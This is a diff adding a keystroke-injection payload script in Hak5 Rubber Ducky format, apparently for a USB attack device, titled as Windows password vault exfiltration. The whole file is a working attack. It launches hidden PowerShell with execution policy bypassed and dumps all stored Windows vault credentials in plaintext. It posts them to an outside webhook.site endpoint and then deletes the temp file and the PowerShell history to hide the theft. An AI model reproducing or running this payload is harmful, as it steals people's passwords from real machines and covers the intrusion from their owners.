@@ -1,0 +1,10 @@
+REM Title:      Windows Passvault exfiltration via webhooks
+REM Description:UPDATED "DigiPass" Password Exfiltration
+REM Author:     CharlesTheGreat (Gabe)
+REM Props:      Hak5 Team
+REM Target:     Windows 10 (Powershell)
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "$webhook=\"<WEBHOOK_TOKEN>\"; [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } | Out-File -FilePath C:\\temp.txt; Invoke-WebRequest -Uri https://webhook.site/$webhook -Method POST -InFile C:\\temp.txt; Remove-Item C:\temp.txt; Remove-Item (Get-PSreadlineOption).HistorySavePath"
+ENTER
